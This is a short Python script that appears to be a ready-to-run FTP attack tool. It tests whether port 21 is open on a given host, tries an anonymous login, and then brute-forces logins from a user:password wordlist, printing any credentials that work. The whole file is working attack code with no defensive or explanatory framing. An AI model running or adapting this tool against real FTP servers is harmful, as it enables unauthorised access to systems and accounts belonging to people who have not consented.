import sys
import ftplib
import socket
#import optparse

def testConn(hostname):
    socket.setdefaulttimeout(2)
    s = socket.socket()
    try:
        s.connect((hostname,21))
    except Exception as inst:
        print(inst)
        return 1
    return 0

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous','Biubiu@gmail.com')
        print("\n[*] "+str(hostname)+' FTP Anonymous Logon Succeeded!')
        return True
    except Exception as inst:
        print("\n[-] "+str(hostname)+' FTP Anonymous Logon Failed.')
        return False

def bruteLogin(hostname,wordlist):
    if(wordlist == ''):
        wordlist = 'wl.txt'
    else:
        pass
    wl = open(wordlist,'r')
    for line in wl.readlines():
        uname = line.split(":")[0]
        passw = line.split(":")[1].strip('\r').strip('\n')
        try:
            print("\n[+] Trying: "+uname+"/"+passw)
            ftp = ftplib.FTP(hostname)
            ftp.login(uname,passw)
            ftp.quit()
            return(uname,passw)
        except Exception as inst:
            continue 


#parser = optparse.OptionParser("Usage %prog -t "+"<Target>")
#parser.add_option('-t',dest="target",type='string')
#(options,args) = parser.parse_args()
#target = options.target

#if(target == None):
#    print(parser.usage)
#    exit(0)
#anonLogin(target)

if (len(sys.argv)==2):
    hostname = sys.argv[1]
    if(testConn(hostname) == 0):
        anonLogin(hostname) 
        ret = bruteLogin(hostname,'')
        if(ret):
            print("\n[*] "+str(hostname)+' FTP Logon Successed: '+ret[0]+"/"+ret[1]) 
        else:
            print("\n[-] Could Find Valid Credentials")    
#elif(len(sys.argv)==3):
#    hostname = sys.argv[1]
#    if(testConn(hostname) == 0):
#        wordlist = sys.argv[2]
#        bruteLogin(hostname,wordlist) 
else:
    print("Usage: python "+sys.argv[0]+" <Host> {wordlist}")
